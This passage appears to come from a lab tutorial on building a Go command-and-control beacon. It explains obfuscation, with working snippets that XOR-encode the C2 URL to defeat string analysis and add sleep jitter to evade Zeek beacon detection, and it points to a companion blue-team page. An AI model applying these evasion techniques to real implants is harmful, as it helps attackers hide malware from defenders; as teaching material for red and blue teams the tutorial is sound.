Why obfuscation? — the problem it solves

Version 3 of the payload works, but it is operationally noisy. Run strings.exe on the compiled binary and you can read the C2 URL, the registry path, and every command string in plaintext. Watch the network traffic in Wireshark and you see a POST arriving every exactly 60 seconds. Open Ghidra and every function name is readable.

Obfuscation addresses these three problems independently. String encoding makes static analysis harder. Jitter makes network detection harder. Binary stripping makes reverse engineering harder. None of these changes the payload's behaviour — it still collects the same data and beacons to the same C2. They only affect what an analyst can observe.

OPSEC note. Obfuscation moves the payload up the Pyramid of Pain from Hash Values (trivial to change) toward Tools and Network Artifacts (require more effort to detect and block). It does not make the payload undetectable — it raises the cost of detection. The blue team analysis page documents what each technique does and does not defeat.

XOR string encoding — concept

XOR is the simplest string encoding: XOR every byte of the string with a fixed key byte, store the result in the binary. At runtime, XOR again with the same key to recover the original string. The plaintext never exists in the binary on disk.

concept — will be added to v4_xor.goGo
const xorKey byte = 0x5A

func xorStr(s string) string {
    b := []byte(s)
    for i := range b { b[i] ^= xorKey }
    return string(b)
}

// Encode once at build time, store the result
var encodedURL = xorStr("http://192.168.1.10:5000/beacon")

// Decode at runtime before use
c2URL := xorStr(encodedURL)

Sleep jitter — concept

A fixed 60-second sleep produces a beacon arrival pattern that is immediately recognisable in network flow logs. Tools like Zeek have dedicated beacon detection modules that look for exactly this: periodic outbound connections with a fixed inter-arrival time. Replacing the static sleep with a random window within ±20% of the base interval breaks this signature.

concept — will be added to v5_jitter.goGo
func jitteredSleep(base time.Duration, pct int) {
    delta := int64(base) * int64(pct) / 100
    jitter := rand.Int63n(delta*2) - delta
    time.Sleep(base + time.Duration(jitter))
}
// jitteredSleep(60*time.Second, 20) sleeps between 48s and 72s
